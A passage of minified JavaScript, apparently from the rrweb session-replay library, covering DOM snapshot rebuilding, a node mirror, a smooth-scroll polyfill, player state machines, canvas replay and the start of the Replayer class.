            case U.ELEMENT_NODE: {
                const s = t, i = jo(s);
                o = e.createElement(i);
                const l = o;
                for (const {name: c, value: u} of Array.from(s.attributes)) l.attributes[c] = u;
                s.scrollLeft && (l.scrollLeft = s.scrollLeft), s.scrollTop && (l.scrollTop = s.scrollTop);
                break
            }
            case U.TEXT_NODE:
                o = e.createTextNode(t.textContent || "");
                break;
            case U.CDATA_SECTION_NODE:
                o = e.createCDATASection(t.data);
                break;
            case U.COMMENT_NODE:
                o = e.createComment(t.textContent || "");
                break;
            case U.DOCUMENT_FRAGMENT_NODE:
                o = r.attachShadow({mode: "open"});
                break;
            default:
                return null
        }
        let a = n.getMeta(t);
        return e instanceof ke && (a || (a = Dn(o, e.unserializedId), n.add(t, a)), e.mirror.add(o, Object.assign({}, a))), o
    }

    function zo(t, e = Io(), n = new ke) {
        function r(o, a) {
            const s = kn(o, n, e, a);
            if (s !== null) if (a?.nodeName !== "IFRAME" && o.nodeType !== U.DOCUMENT_FRAGMENT_NODE && (a?.appendChild(s), s.parentNode = a, s.parentElement = a), o.nodeName === "IFRAME") {
                const i = o.contentDocument;
                i && r(i, s)
            } else (o.nodeType === U.DOCUMENT_NODE || o.nodeType === U.ELEMENT_NODE || o.nodeType === U.DOCUMENT_FRAGMENT_NODE) && (o.nodeType === U.ELEMENT_NODE && o.shadowRoot && r(o.shadowRoot, s), o.childNodes.forEach(i => r(i, s)))
        }

        return r(t, null), n
    }

    function Ho() {
        return new Yo
    }

    class Yo {
        constructor() {
            this.idNodeMap = new Map, this.nodeMetaMap = new WeakMap
        }

        getId(e) {
            var n;
            if (!e) return -1;
            const r = (n = this.getMeta(e)) === null || n === void 0 ? void 0 : n.id;
            return r ?? -1
        }

        getNode(e) {
            return this.idNodeMap.get(e) || null
        }

        getIds() {
            return Array.from(this.idNodeMap.keys())
        }

        getMeta(e) {
            return this.nodeMetaMap.get(e) || null
        }

        removeNodeFromMap(e) {
            const n = this.getId(e);
            this.idNodeMap.delete(n), e.childNodes && e.childNodes.forEach(r => this.removeNodeFromMap(r))
        }

        has(e) {
            return this.idNodeMap.has(e)
        }

        hasNode(e) {
            return this.nodeMetaMap.has(e)
        }

        add(e, n) {
            const r = n.id;
            this.idNodeMap.set(r, e), this.nodeMetaMap.set(e, n)
        }

        replace(e, n) {
            const r = this.getNode(e);
            if (r) {
                const o = this.nodeMetaMap.get(r);
                o && this.nodeMetaMap.set(n, o)
            }
            this.idNodeMap.set(e, n)
        }

        reset() {
            this.idNodeMap = new Map, this.nodeMetaMap = new WeakMap
        }
    }

    function Dn(t, e) {
        switch (t.RRNodeType) {
            case R.Document:
                return {id: e, type: t.RRNodeType, childNodes: []};
            case R.DocumentType: {
                const n = t;
                return {id: e, type: t.RRNodeType, name: n.name, publicId: n.publicId, systemId: n.systemId}
            }
            case R.Element:
                return {id: e, type: t.RRNodeType, tagName: t.tagName.toLowerCase(), attributes: {}, childNodes: []};
            case R.Text:
                return {id: e, type: t.RRNodeType, textContent: t.textContent || ""};
            case R.Comment:
                return {id: e, type: t.RRNodeType, textContent: t.textContent || ""};
            case R.CDATA:
                return {id: e, type: t.RRNodeType, textContent: ""}
        }
    }

    function Rn(t) {
        return {
            all: t = t || new Map, on: function (e, n) {
                var r = t.get(e);
                r ? r.push(n) : t.set(e, [n])
            }, off: function (e, n) {
                var r = t.get(e);
                r && (n ? r.splice(r.indexOf(n) >>> 0, 1) : t.set(e, []))
            }, emit: function (e, n) {
                var r = t.get(e);
                r && r.slice().map(function (o) {
                    o(n)
                }), (r = t.get("*")) && r.slice().map(function (o) {
                    o(e, n)
                })
            }
        }
    }

    var Xo = Object.freeze({__proto__: null, default: Rn});

    function Zo(t = window, e = document) {
        if ("scrollBehavior" in e.documentElement.style && t.__forceSmoothScrollPolyfill__ !== !0) return;
        const n = t.HTMLElement || t.Element, r = 468, o = {
            scroll: t.scroll || t.scrollTo,
            scrollBy: t.scrollBy,
            elementScroll: n.prototype.scroll || l,
            scrollIntoView: n.prototype.scrollIntoView
        }, a = t.performance && t.performance.now ? t.performance.now.bind(t.performance) : Date.now;

        function s(f) {
            const y = ["MSIE ", "Trident/", "Edge/"];
            return new RegExp(y.join("|")).test(f)
        }

        const i = s(t.navigator.userAgent) ? 1 : 0;

        function l(f, y) {
            this.scrollLeft = f, this.scrollTop = y
        }

        function c(f) {
            return .5 * (1 - Math.cos(Math.PI * f))
        }

        function u(f) {
            if (f === null || typeof f != "object" || f.behavior === void 0 || f.behavior === "auto" || f.behavior === "instant") return !0;
            if (typeof f == "object" && f.behavior === "smooth") return !1;
            throw new TypeError("behavior member of ScrollOptions " + f.behavior + " is not a valid value for enumeration ScrollBehavior.")
        }

        function d(f, y) {
            if (y === "Y") return f.clientHeight + i < f.scrollHeight;
            if (y === "X") return f.clientWidth + i < f.scrollWidth
        }

        function h(f, y) {
            const g = t.getComputedStyle(f, null)["overflow" + y];
            return g === "auto" || g === "scroll"
        }

        function p(f) {
            const y = d(f, "Y") && h(f, "Y"), g = d(f, "X") && h(f, "X");
            return y || g
        }

        function m(f) {
            for (; f !== e.body && p(f) === !1;) f = f.parentNode || f.host;
            return f
        }

        function b(f) {
            const y = a();
            let g, E, k, x = (y - f.startTime) / r;
            x = x > 1 ? 1 : x, g = c(x), E = f.startX + (f.x - f.startX) * g, k = f.startY + (f.y - f.startY) * g, f.method.call(f.scrollable, E, k), (E !== f.x || k !== f.y) && t.requestAnimationFrame(b.bind(t, f))
        }

        function S(f, y, g) {
            let E, k, x, F;
            const _ = a();
            f === e.body ? (E = t, k = t.scrollX || t.pageXOffset, x = t.scrollY || t.pageYOffset, F = o.scroll) : (E = f, k = f.scrollLeft, x = f.scrollTop, F = l), b({
                scrollable: E,
                method: F,
                startTime: _,
                startX: k,
                startY: x,
                x: y,
                y: g
            })
        }

        t.scroll = t.scrollTo = function () {
            if (arguments[0] !== void 0) {
                if (u(arguments[0]) === !0) {
                    o.scroll.call(t, arguments[0].left !== void 0 ? arguments[0].left : typeof arguments[0] != "object" ? arguments[0] : t.scrollX || t.pageXOffset, arguments[0].top !== void 0 ? arguments[0].top : arguments[1] !== void 0 ? arguments[1] : t.scrollY || t.pageYOffset);
                    return
                }
                S.call(t, e.body, arguments[0].left !== void 0 ? ~~arguments[0].left : t.scrollX || t.pageXOffset, arguments[0].top !== void 0 ? ~~arguments[0].top : t.scrollY || t.pageYOffset)
            }
        }, t.scrollBy = function () {
            if (arguments[0] !== void 0) {
                if (u(arguments[0])) {
                    o.scrollBy.call(t, arguments[0].left !== void 0 ? arguments[0].left : typeof arguments[0] != "object" ? arguments[0] : 0, arguments[0].top !== void 0 ? arguments[0].top : arguments[1] !== void 0 ? arguments[1] : 0);
                    return
                }
                S.call(t, e.body, ~~arguments[0].left + (t.scrollX || t.pageXOffset), ~~arguments[0].top + (t.scrollY || t.pageYOffset))
            }
        }, n.prototype.scroll = n.prototype.scrollTo = function () {
            if (arguments[0] === void 0) return;
            if (u(arguments[0]) === !0) {
                if (typeof arguments[0] == "number" && arguments[1] === void 0) throw new SyntaxError("Value could not be converted");
                o.elementScroll.call(this, arguments[0].left !== void 0 ? ~~arguments[0].left : typeof arguments[0] != "object" ? ~~arguments[0] : this.scrollLeft, arguments[0].top !== void 0 ? ~~arguments[0].top : arguments[1] !== void 0 ? ~~arguments[1] : this.scrollTop);
                return
            }
            const f = arguments[0].left, y = arguments[0].top;
            S.call(this, this, typeof f > "u" ? this.scrollLeft : ~~f, typeof y > "u" ? this.scrollTop : ~~y)
        }, n.prototype.scrollBy = function () {
            if (arguments[0] !== void 0) {
                if (u(arguments[0]) === !0) {
                    o.elementScroll.call(this, arguments[0].left !== void 0 ? ~~arguments[0].left + this.scrollLeft : ~~arguments[0] + this.scrollLeft, arguments[0].top !== void 0 ? ~~arguments[0].top + this.scrollTop : ~~arguments[1] + this.scrollTop);
                    return
                }
                this.scroll({
                    left: ~~arguments[0].left + this.scrollLeft,
                    top: ~~arguments[0].top + this.scrollTop,
                    behavior: arguments[0].behavior
                })
            }
        }, n.prototype.scrollIntoView = function () {
            if (u(arguments[0]) === !0) {
                o.scrollIntoView.call(this, arguments[0] === void 0 ? !0 : arguments[0]);
                return
            }
            const f = m(this), y = f.getBoundingClientRect(), g = this.getBoundingClientRect();
            f !== e.body ? (S.call(this, f, f.scrollLeft + g.left - y.left, f.scrollTop + g.top - y.top), t.getComputedStyle(f).position !== "fixed" && t.scrollBy({
                left: y.left,
                top: y.top,
                behavior: "smooth"
            })) : t.scrollBy({left: g.left, top: g.top, behavior: "smooth"})
        }
    }

    class Ko {
        constructor(e = [], n) {
            this.timeOffset = 0, this.raf = null, this.actions = e, this.speed = n.speed, this.liveMode = n.liveMode
        }

        addAction(e) {
            if (!this.actions.length || this.actions[this.actions.length - 1].delay <= e.delay) {
                this.actions.push(e);
                return
            }
            const n = this.findActionIndex(e);
            this.actions.splice(n, 0, e)
        }

        start() {
            this.timeOffset = 0;
            let e = performance.now();
            const n = () => {
                const r = performance.now();
                for (this.timeOffset += (r - e) * this.speed, e = r; this.actions.length;) {
                    const o = this.actions[0];
                    if (this.timeOffset >= o.delay) this.actions.shift(), o.doAction(); else break
                }
                (this.actions.length > 0 || this.liveMode) && (this.raf = requestAnimationFrame(n))
            };
            this.raf = requestAnimationFrame(n)
        }

        clear() {
            this.raf && (cancelAnimationFrame(this.raf), this.raf = null), this.actions.length = 0
        }

        setSpeed(e) {
            this.speed = e
        }

        toggleLiveMode(e) {
            this.liveMode = e
        }

        isActive() {
            return this.raf !== null
        }

        findActionIndex(e) {
            let n = 0, r = this.actions.length - 1;
            for (; n <= r;) {
                const o = Math.floor((n + r) / 2);
                if (this.actions[o].delay < e.delay) n = o + 1; else if (this.actions[o].delay > e.delay) r = o - 1; else return o + 1
            }
            return n
        }
    }

    function xn(t, e) {
        if (t.type === C.IncrementalSnapshot && t.data.source === N.MouseMove && t.data.positions && t.data.positions.length) {
            const n = t.data.positions[0].timeOffset, r = t.timestamp + n;
            return t.delay = r - e, r - e
        }
        return t.delay = t.timestamp - e, t.delay
    }/*! *****************************************************************************
    Copyright (c) Microsoft Corporation.

    Permission to use, copy, modify, and/or distribute this software for any
    purpose with or without fee is hereby granted.

    THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH
    REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY
    AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT,
    INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM
    LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR
    OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR
    PERFORMANCE OF THIS SOFTWARE.
    ***************************************************************************** */
    function On(t, e) {
        var n = typeof Symbol == "function" && t[Symbol.iterator];
        if (!n) return t;
        var r, o, a = n.call(t), s = [];
        try {
            for (; (e === void 0 || e-- > 0) && !(r = a.next()).done;) s.push(r.value)
        } catch (i) {
            o = {error: i}
        } finally {
            try {
                r && !r.done && (n = a.return) && n.call(a)
            } finally {
                if (o) throw o.error
            }
        }
        return s
    }

    var De;
    (function (t) {
        t[t.NotStarted = 0] = "NotStarted", t[t.Running = 1] = "Running", t[t.Stopped = 2] = "Stopped"
    })(De || (De = {}));
    var Ln = {type: "xstate.init"};

    function vt(t) {
        return t === void 0 ? [] : [].concat(t)
    }

    function Re(t) {
        return {type: "xstate.assign", assignment: t}
    }

    function An(t, e) {
        return typeof (t = typeof t == "string" && e && e[t] ? e[t] : t) == "string" ? {type: t} : typeof t == "function" ? {
            type: t.name,
            exec: t
        } : t
    }

    function Ke(t) {
        return function (e) {
            return t === e
        }
    }

    function _n(t) {
        return typeof t == "string" ? {type: t} : t
    }

    function Fn(t, e) {
        return {value: t, context: e, actions: [], changed: !1, matches: Ke(t)}
    }

    function Pn(t, e, n) {
        var r = e, o = !1;
        return [t.filter(function (a) {
            if (a.type === "xstate.assign") {
                o = !0;
                var s = Object.assign({}, r);
                return typeof a.assignment == "function" ? s = a.assignment(r, n) : Object.keys(a.assignment).forEach(function (i) {
                    s[i] = typeof a.assignment[i] == "function" ? a.assignment[i](r, n) : a.assignment[i]
                }), r = s, !1
            }
            return !0
        }), r, o]
    }

    function Wn(t, e) {
        e === void 0 && (e = {});
        var n = On(Pn(vt(t.states[t.initial].entry).map(function (s) {
            return An(s, e.actions)
        }), t.context, Ln), 2), r = n[0], o = n[1], a = {
            config: t,
            _options: e,
            initialState: {value: t.initial, actions: r, context: o, matches: Ke(t.initial)},
            transition: function (s, i) {
                var l, c, u = typeof s == "string" ? {value: s, context: t.context} : s, d = u.value, h = u.context,
                    p = _n(i), m = t.states[d];
                if (m.on) {
                    var b = vt(m.on[p.type]);
                    try {
                        for (var S = function (L) {
                            var te = typeof Symbol == "function" && Symbol.iterator, w = te && L[te], v = 0;
                            if (w) return w.call(L);
                            if (L && typeof L.length == "number") return {
                                next: function () {
                                    return L && v >= L.length && (L = void 0), {value: L && L[v++], done: !L}
                                }
                            };
                            throw new TypeError(te ? "Object is not iterable." : "Symbol.iterator is not defined.")
                        }(b), f = S.next(); !f.done; f = S.next()) {
                            var y = f.value;
                            if (y === void 0) return Fn(d, h);
                            var g = typeof y == "string" ? {target: y} : y, E = g.target, k = g.actions,
                                x = k === void 0 ? [] : k, F = g.cond, _ = F === void 0 ? function () {
                                    return !0
                                } : F, J = E === void 0, Y = E ?? d, q = t.states[Y];
                            if (_(h, p)) {
                                var z = On(Pn((J ? vt(x) : [].concat(m.exit, x, q.entry).filter(function (L) {
                                    return L
                                })).map(function (L) {
                                    return An(L, a._options.actions)
                                }), h, p), 3), X = z[0], $ = z[1], Z = z[2], H = E ?? d;
                                return {
                                    value: H,
                                    context: $,
                                    actions: X,
                                    changed: E !== d || X.length > 0 || Z,
                                    matches: Ke(H)
                                }
                            }
                        }
                    } catch (L) {
                        l = {error: L}
                    } finally {
                        try {
                            f && !f.done && (c = S.return) && c.call(S)
                        } finally {
                            if (l) throw l.error
                        }
                    }
                }
                return Fn(d, h)
            }
        };
        return a
    }

    var $n = function (t, e) {
        return t.actions.forEach(function (n) {
            var r = n.exec;
            return r && r(t.context, e)
        })
    };

    function Un(t) {
        var e = t.initialState, n = De.NotStarted, r = new Set, o = {
            _machine: t, send: function (a) {
                n === De.Running && (e = t.transition(e, a), $n(e, _n(a)), r.forEach(function (s) {
                    return s(e)
                }))
            }, subscribe: function (a) {
                return r.add(a), a(e), {
                    unsubscribe: function () {
                        return r.delete(a)
                    }
                }
            }, start: function (a) {
                if (a) {
                    var s = typeof a == "object" ? a : {context: t.config.context, value: a};
                    e = {value: s.value, actions: [], context: s.context, matches: Ke(s.value)}
                }
                return n = De.Running, $n(e, Ln), o
            }, stop: function () {
                return n = De.Stopped, r.clear(), o
            }, get state() {
                return e
            }, get status() {
                return n
            }
        };
        return o
    }

    var Qo = Object.defineProperty, Jo = Object.defineProperties, qo = Object.getOwnPropertyDescriptors,
        Vn = Object.getOwnPropertySymbols, es = Object.prototype.hasOwnProperty,
        ts = Object.prototype.propertyIsEnumerable,
        Bn = (t, e, n) => e in t ? Qo(t, e, {enumerable: !0, configurable: !0, writable: !0, value: n}) : t[e] = n,
        St = (t, e) => {
            for (var n in e || (e = {})) es.call(e, n) && Bn(t, n, e[n]);
            if (Vn) for (var n of Vn(e)) ts.call(e, n) && Bn(t, n, e[n]);
            return t
        }, bt = (t, e) => Jo(t, qo(e));

    function ns(t, e) {
        for (let n = t.length - 1; n >= 0; n--) {
            const r = t[n];
            if (r.type === C.Meta && r.timestamp <= e) return t.slice(n)
        }
        return t
    }

    function rs(t, {getCastFn: e, applyEventsSynchronously: n, emitter: r}) {
        const o = Wn({
            id: "player",
            context: t,
            initial: "paused",
            states: {
                playing: {
                    on: {
                        PAUSE: {target: "paused", actions: ["pause"]},
                        CAST_EVENT: {target: "playing", actions: "castEvent"},
                        END: {target: "paused", actions: ["resetLastPlayedEvent", "pause"]},
                        ADD_EVENT: {target: "playing", actions: ["addEvent"]}
                    }
                },
                paused: {
                    on: {
                        PLAY: {target: "playing", actions: ["recordTimeOffset", "play"]},
                        CAST_EVENT: {target: "paused", actions: "castEvent"},
                        TO_LIVE: {target: "live", actions: ["startLive"]},
                        ADD_EVENT: {target: "paused", actions: ["addEvent"]}
                    }
                },
                live: {
                    on: {
                        ADD_EVENT: {target: "live", actions: ["addEvent"]},
                        CAST_EVENT: {target: "live", actions: ["castEvent"]}
                    }
                }
            }
        }, {
            actions: {
                castEvent: Re({lastPlayedEvent: (a, s) => s.type === "CAST_EVENT" ? s.payload.event : a.lastPlayedEvent}),
                recordTimeOffset: Re((a, s) => {
                    let i = a.timeOffset;
                    return "payload" in s && "timeOffset" in s.payload && (i = s.payload.timeOffset), bt(St({}, a), {
                        timeOffset: i,
                        baselineTime: a.events[0].timestamp + i
                    })
                }),
                play(a) {
                    var s;
                    const {timer: i, events: l, baselineTime: c, lastPlayedEvent: u} = a;
                    i.clear();
                    for (const m of l) xn(m, c);
                    const d = ns(l, c);
                    let h = u?.timestamp;
                    u?.type === C.IncrementalSnapshot && u.data.source === N.MouseMove && (h = u.timestamp + ((s = u.data.positions[0]) == null ? void 0 : s.timeOffset)), c < (h || 0) && r.emit(O.PlayBack);
                    const p = new Array;
                    for (const m of d) if (!(h && h < c && (m.timestamp <= h || m === u))) if (m.timestamp < c) p.push(m); else {
                        const b = e(m, !1);
                        i.addAction({
                            doAction: () => {
                                b()
                            }, delay: m.delay
                        })
                    }
                    n(p), r.emit(O.Flush), i.start()
                },
                pause(a) {
                    a.timer.clear()
                },
                resetLastPlayedEvent: Re(a => bt(St({}, a), {lastPlayedEvent: null})),
                startLive: Re({baselineTime: (a, s) => (a.timer.toggleLiveMode(!0), a.timer.start(), s.type === "TO_LIVE" && s.payload.baselineTime ? s.payload.baselineTime : Date.now())}),
                addEvent: Re((a, s) => {
                    const {baselineTime: i, timer: l, events: c} = a;
                    if (s.type === "ADD_EVENT") {
                        const {event: u} = s.payload;
                        xn(u, i);
                        let d = c.length - 1;
                        if (!c[d] || c[d].timestamp <= u.timestamp) c.push(u); else {
                            let m = -1, b = 0;
                            for (; b <= d;) {
                                const S = Math.floor((b + d) / 2);
                                c[S].timestamp <= u.timestamp ? b = S + 1 : d = S - 1
                            }
                            m === -1 && (m = b), c.splice(m, 0, u)
                        }
                        const h = u.timestamp < i, p = e(u, h);
                        h ? p() : l.isActive() && l.addAction({
                            doAction: () => {
                                p()
                            }, delay: u.delay
                        })
                    }
                    return bt(St({}, a), {events: c})
                })
            }
        });
        return Un(o)
    }

    function os(t) {
        const e = Wn({
            id: "speed",
            context: t,
            initial: "normal",
            states: {
                normal: {
                    on: {
                        FAST_FORWARD: {target: "skipping", actions: ["recordSpeed", "setSpeed"]},
                        SET_SPEED: {target: "normal", actions: ["setSpeed"]}
                    }
                },
                skipping: {
                    on: {
                        BACK_TO_NORMAL: {target: "normal", actions: ["restoreSpeed"]},
                        SET_SPEED: {target: "normal", actions: ["setSpeed"]}
                    }
                }
            }
        }, {
            actions: {
                setSpeed: (n, r) => {
                    "payload" in r && n.timer.setSpeed(r.payload.speed)
                }, recordSpeed: Re({normalSpeed: n => n.timer.speed}), restoreSpeed: n => {
                    n.timer.setSpeed(n.normalSpeed)
                }
            }
        });
        return Un(e)
    }

    const ss = t => [`.${t} { background: currentColor }`, "noscript { display: none !important; }"];
    var is = (t, e, n) => new Promise((r, o) => {
        var a = l => {
            try {
                i(n.next(l))
            } catch (c) {
                o(c)
            }
        }, s = l => {
            try {
                i(n.throw(l))
            } catch (c) {
                o(c)
            }
        }, i = l => l.done ? r(l.value) : Promise.resolve(l.value).then(a, s);
        i((n = n.apply(t, e)).next())
    });
    const Gn = new Map;

    function jn(t, e) {
        let n = Gn.get(t);
        return n || (n = new Map, Gn.set(t, n)), n.has(e) || n.set(e, []), n.get(e)
    }

    function ye(t, e, n) {
        return r => is(this, null, function* () {
            if (r && typeof r == "object" && "rr_type" in r) if (n && (n.isUnchanged = !1), r.rr_type === "ImageBitmap" && "args" in r) {
                const o = yield ye(t, e, n)(r.args);
                return yield createImageBitmap.apply(null, o)
            } else if ("index" in r) {
                if (n || e === null) return r;
                const {rr_type: o, index: a} = r;
                return jn(e, o)[a]
            } else if ("args" in r) {
                const {rr_type: o, args: a} = r, s = window[o];
                return new s(...yield Promise.all(a.map(ye(t, e, n))))
            } else {
                if ("base64" in r) return ro(r.base64);
                if ("src" in r) {
                    const o = t.get(r.src);
                    if (o) return o;
                    {
                        const a = new Image;
                        return a.src = r.src, t.set(r.src, a), a
                    }
                } else if ("data" in r && r.rr_type === "Blob") {
                    const o = yield Promise.all(r.data.map(ye(t, e, n)));
                    return new Blob(o, {type: r.type})
                }
            } else if (Array.isArray(r)) return yield Promise.all(r.map(ye(t, e, n)));
            return r
        })
    }

    var as = (t, e, n) => new Promise((r, o) => {
        var a = l => {
            try {
                i(n.next(l))
            } catch (c) {
                o(c)
            }
        }, s = l => {
            try {
                i(n.throw(l))
            } catch (c) {
                o(c)
            }
        }, i = l => l.done ? r(l.value) : Promise.resolve(l.value).then(a, s);
        i((n = n.apply(t, e)).next())
    });

    function ls(t, e) {
        try {
            return e === pe.WebGL ? t.getContext("webgl") || t.getContext("experimental-webgl") : t.getContext("webgl2")
        } catch {
            return null
        }
    }

    const cs = ["WebGLActiveInfo", "WebGLBuffer", "WebGLFramebuffer", "WebGLProgram", "WebGLRenderbuffer", "WebGLShader", "WebGLShaderPrecisionFormat", "WebGLTexture", "WebGLUniformLocation", "WebGLVertexArrayObject"];

    function us(t, e) {
        if (!(e != null && e.constructor)) return;
        const {name: n} = e.constructor;
        if (!cs.includes(n)) return;
        const r = jn(t, n);
        r.includes(e) || r.push(e)
    }

    function ds(t) {
        return as(this, arguments, function* ({mutation: e, target: n, type: r, imageMap: o, errorHandler: a}) {
            try {
                const s = ls(n, r);
                if (!s) return;
                if (e.setter) {
                    s[e.property] = e.args[0];
                    return
                }
                const i = s[e.property], l = yield Promise.all(e.args.map(ye(o, s))), c = i.apply(s, l);
                us(s, c)
            } catch (s) {
                a(e, s)
            }
        })
    }

    var hs = (t, e, n) => new Promise((r, o) => {
        var a = l => {
            try {
                i(n.next(l))
            } catch (c) {
                o(c)
            }
        }, s = l => {
            try {
                i(n.throw(l))
            } catch (c) {
                o(c)
            }
        }, i = l => l.done ? r(l.value) : Promise.resolve(l.value).then(a, s);
        i((n = n.apply(t, e)).next())
    });

    function ps(t) {
        return hs(this, arguments, function* ({event: e, mutation: n, target: r, imageMap: o, errorHandler: a}) {
            try {
                const s = r.getContext("2d");
                if (n.setter) {
                    s[n.property] = n.args[0];
                    return
                }
                const i = s[n.property];
                if (n.property === "drawImage" && typeof n.args[0] == "string") o.get(e), i.apply(s, n.args); else {
                    const l = yield Promise.all(n.args.map(ye(o, s)));
                    i.apply(s, l)
                }
            } catch (s) {
                a(n, s)
            }
        })
    }

    var ms = (t, e, n) => new Promise((r, o) => {
        var a = l => {
            try {
                i(n.next(l))
            } catch (c) {
                o(c)
            }
        }, s = l => {
            try {
                i(n.throw(l))
            } catch (c) {
                o(c)
            }
        }, i = l => l.done ? r(l.value) : Promise.resolve(l.value).then(a, s);
        i((n = n.apply(t, e)).next())
    });

    function zn(t) {
        return ms(this, arguments, function* ({
                                                  event: e,
                                                  mutation: n,
                                                  target: r,
                                                  imageMap: o,
                                                  canvasEventMap: a,
                                                  errorHandler: s
                                              }) {
            try {
                const i = a.get(e) || n, l = "commands" in i ? i.commands : [i];
                if ([pe.WebGL, pe.WebGL2].includes(n.type)) {
                    for (let c = 0; c < l.length; c++) {
                        const u = l[c];
                        yield ds({mutation: u, type: n.type, target: r, imageMap: o, errorHandler: s})
                    }
                    return
                }
                for (let c = 0; c < l.length; c++) {
                    const u = l[c];
                    yield ps({event: e, mutation: u, target: r, imageMap: o, errorHandler: s})
                }
            } catch (i) {
                s(n, i)
            }
        })
    }

    var fs = Object.defineProperty, ys = Object.defineProperties, gs = Object.getOwnPropertyDescriptors,
        Hn = Object.getOwnPropertySymbols, vs = Object.prototype.hasOwnProperty,
        Ss = Object.prototype.propertyIsEnumerable,
        Yn = (t, e, n) => e in t ? fs(t, e, {enumerable: !0, configurable: !0, writable: !0, value: n}) : t[e] = n,
        Qe = (t, e) => {
            for (var n in e || (e = {})) vs.call(e, n) && Yn(t, n, e[n]);
            if (Hn) for (var n of Hn(e)) Ss.call(e, n) && Yn(t, n, e[n]);
            return t
        }, wt = (t, e) => ys(t, gs(e)), Et = (t, e, n) => new Promise((r, o) => {
            var a = l => {
                try {
                    i(n.next(l))
                } catch (c) {
                    o(c)
                }
            }, s = l => {
                try {
                    i(n.throw(l))
                } catch (c) {
                    o(c)
                }
            }, i = l => l.done ? r(l.value) : Promise.resolve(l.value).then(a, s);
            i((n = n.apply(t, e)).next())
        });
    const bs = 10 * 1e3, ws = 5 * 1e3, Es = Rn || Xo, Nt = "[replayer]",
        Ct = {duration: 500, lineCap: "round", lineWidth: 3, strokeStyle: "red"};

    function Xn(t) {
        return t.type == C.IncrementalSnapshot && (t.data.source == N.TouchMove || t.data.source == N.MouseInteraction && t.data.type == j.TouchStart)
    }

    class Ns {
        constructor(e, n) {
            if (this.usingVirtualDom = !1, this.virtualDom = new ke, this.mouseTail = null, this.tailPositions = [], this.emitter = Es(), this.legacy_missingNodeRetryMap = {}, this.cache = Wt(), this.imageMap = new Map, this.canvasEventMap = new Map, this.mirror = kt(), this.styleMirror = new ht, this.firstFullSnapshot = null, this.newDocumentQueue = [], this.mousePos = null, this.touchActive = null, this.lastSelectionData = null, this.constructedStyleMutations = [], this.adoptedStyleSheets = [], this.handleResize = i => {
                this.iframe.style.display = "inherit";
                for (const l of [this.mouseTail, this.iframe]) !l || (l.setAttribute("width", String(i.width)), l.setAttribute("height", String(i.height)))
            }, this.applyEventsSynchronously = i => {
                for (const l of i) {
                    switch (l.type) {
                        case C.DomContentLoaded:
                        case C.Load:
                        case C.Custom:
                            continue;
                        case C.FullSnapshot:
                        case C.Meta:
                        case C.Plugin:
                        case C.IncrementalSnapshot:
                            break
                    }
                    this.getCastFn(l, !0)()
                }
                this.touchActive === !0 ? this.mouse.classList.add("touch-active") : this.touchActive === !1 && this.mouse.classList.remove("touch-active"), this.touchActive = null
            }, this.getCastFn = (i, l = !1) => {
                let c;
                switch (i.type) {
                    case C.DomContentLoaded:
                    case C.Load:
                        break;
                    case C.Custom:
                        c = () => {
                            this.emitter.emit(O.CustomEvent, i)
                        };
                        break;
                    case C.Meta:
                        c = () => this.emitter.emit(O.Resize, {width: i.data.width, height: i.data.height});
                        break;
                    case C.FullSnapshot:
                        c = () => {
                            var u;
                            if (this.firstFullSnapshot) {
                                if (this.firstFullSnapshot === i) {
                                    this.firstFullSnapshot = !0;
                                    return
                                }
                            } else this.firstFullSnapshot = !0;
                            this.rebuildFullSnapshot(i, l), (u = this.iframe.contentWindow) == null || u.scrollTo(i.data.initialOffset), this.styleMirror.reset()
                        };
                        break;
                    case C.IncrementalSnapshot:
                        c = () => {
                            if (this.applyIncremental(i, l), !l && (i === this.nextUserInteractionEvent && (this.nextUserInteractionEvent = null, this.backToNormal()), this.config.skipInactive && !this.nextUserInteractionEvent)) {
                                for (const u of this.service.state.context.events) if (!(u.timestamp <= i.timestamp) && this.isUserInteraction(u)) {
                                    u.delay - i.delay > bs * this.speedService.state.context.timer.speed && (this.nextUserInteractionEvent = u);
                                    break
                                }
                                if (this.nextUserInteractionEvent) {
                                    const u = this.nextUserInteractionEvent.delay - i.delay,
                                        d = {speed: Math.min(Math.round(u / ws), this.config.maxSpeed)};
                                    this.speedService.send({
                                        type: "FAST_FORWARD",
                                        payload: d
                                    }), this.emitter.emit(O.SkipStart, d)
                                }
                            }
                        };
                        break
                }
                return () => {
                    c && c();
                    for (const d of this.config.plugins || []) d.handler && d.handler(i, l, {replayer: this});
                    this.service.send({type: "CAST_EVENT", payload: {event: i}});
                    const u = this.service.state.context.events.length - 1;
                    if (i === this.service.state.context.events[u]) {
                        const d = () => {
                            u < this.service.state.context.events.length - 1 || (this.backToNormal(), this.service.send("END"), this.emitter.emit(O.Finish))
                        };
                        i.type === C.IncrementalSnapshot && i.data.source === N.MouseMove && i.data.positions.length ? setTimeout(() => {
                            d()
                        }, Math.max(0, -i.data.positions[0].timeOffset + 50)) : d()
                    }
                    this.emitter.emit(O.EventCast, i)
                }
            }, !(n != null && n.liveMode) && e.length < 2) throw new Error("Replayer need at least 2 events.");
            const r = {
                speed: 1,
                maxSpeed: 360,
                root: document.body,
                loadTimeout: 0,
                skipInactive: !1,
                showWarning: !0,
                showDebug: !1,
                blockClass: "rr-block",
                liveMode: !1,
                insertStyleRules: [],
                triggerFocus: !0,
                UNSAFE_replayCanvas: !1,
                pauseAnimation: !0,
                mouseTail: Ct,
                useVirtualDom: !0
            };
            this.config = Object.assign({}, r, n), this.handleResize = this.handleResize.bind(this), this.getCastFn = this.getCastFn.bind(this), this.applyEventsSynchronously = this.applyEventsSynchronously.bind(this), this.emitter.on(O.Resize, this.handleResize), this.setupDom();
            for (const i of this.config.plugins || []) i.getMirror && i.getMirror({nodeMirror: this.mirror});
            this.emitter.on(O.Flush, () => {
                if (this.usingVirtualDom) {
                    const i = {
                        mirror: this.mirror,
                        applyCanvas: (l, c, u) => {
                            zn({
                                event: l,
                                mutation: c,
                                target: u,
                                imageMap: this.imageMap,
                                canvasEventMap: this.canvasEventMap,
                                errorHandler: this.warnCanvasMutationFailed.bind(this)
                            })
